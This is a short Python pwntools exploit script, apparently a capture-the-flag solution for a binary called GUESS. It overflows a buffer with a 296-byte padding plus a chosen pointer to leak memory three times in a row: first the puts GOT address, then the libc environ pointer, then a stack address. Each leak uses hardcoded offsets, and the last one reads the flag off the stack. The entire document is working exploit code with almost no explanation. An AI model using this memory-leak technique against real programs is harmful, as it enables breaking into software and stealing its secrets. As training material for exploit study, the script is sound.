#/usr/bin/env python

from pwn import *

#all we do is just to leak a stack address
#use environ is a good choice!
p = process('./GUESS')
bin = ELF("./GUESS")
libc = ELF("libc.so.6")
puts_got = bin.got['puts']

p.recvuntil("Please type your guessing flag\n")

p.sendline('a'*296 + p64(puts_got))
p.recvline()
p.recvuntil(": ")
puts_addr = u64(p.recv(6).ljust(8, "\x00"))
print "puts_addr: " + hex(puts_addr)
offset = 0x3c6f38 - libc.symbols['puts']
environ_addr = puts_addr + offset
print "environ_addr: " + hex(environ_addr)

p.recvuntil("Please type your guessing flag\n")

p.sendline('a'*296 + p64(environ_addr))
p.recvline()
p.recvuntil(": ")
stack_addr = u64(p.recv(6).ljust(8, "\x00"))
print "stack_addr: " + hex(stack_addr)

offset2 = 0x7fffffffdbd0 - 0x7fffffffdd38
flag = stack_addr + offset2
p.recvuntil("Please type your guessing flag\n")

p.sendline('a'*296 + p64(flag))
p.recvline()
p.recvuntil(": ")
print p.recvline()